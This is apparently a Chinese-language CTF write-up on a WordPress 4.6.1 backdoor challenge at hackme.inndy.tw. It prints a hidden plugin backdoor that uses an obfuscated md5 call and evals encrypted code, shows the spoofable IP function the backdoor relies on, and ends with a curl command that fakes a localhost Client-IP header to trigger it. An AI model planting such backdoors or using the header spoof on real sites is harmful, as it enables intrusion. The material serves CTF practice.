@@ -1,0 +1,45 @@
+====================wordpress 环境搭建====================
+使用docker搭建
+需要搭建wordpress mysql
+创建使用的数据库
+==========================================================
+下载源码
+查看版本 4.6.1 (可以在 wp-admin/about.php 看到)
+
+diff wordpress wordpress-4.6.1 -r 
+diff '--color=auto' -r wordpress/wp-includes/functions.php wordpress-4.6.1/wp-includes/functions.php
+10d9
+< 
+283,299d281
+< }
+< 
+< /**
+<  * Try to get user's IP
+<  *
+<  * @since 0.87
+<  *
+<  * @return string User's IP
+<  */
+< function wp_get_user_ip() {
+<       $ip = $_SERVER['REMOTE_ADDR'];
+<       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+<               $ip = $_SERVER['HTTP_CLIENT_IP'];
+<       } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+<               $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+<       }
+<       return $ip;
+
+搜索wp_get_user_ip函数找到插件 /wordpress/wp-content/plugins/core.php
+function print_f14g()
+{
+	$h = 'm'.sprintf('%s%d','d',-4+9e0);
+	if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
+		if(wp_get_user_ip() === '127.0.0.1') {
+			eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
+		} else {
+			die('</head><body><h1>Sorry, Only admin from localhost can get flag');
+		}
+	}
+}
+
+curl 'https://wp.hackme.inndy.tw/?passw0rd=cat%20flag' --header 'client-ip: 127.0.0.1' -s|grep -i flag{
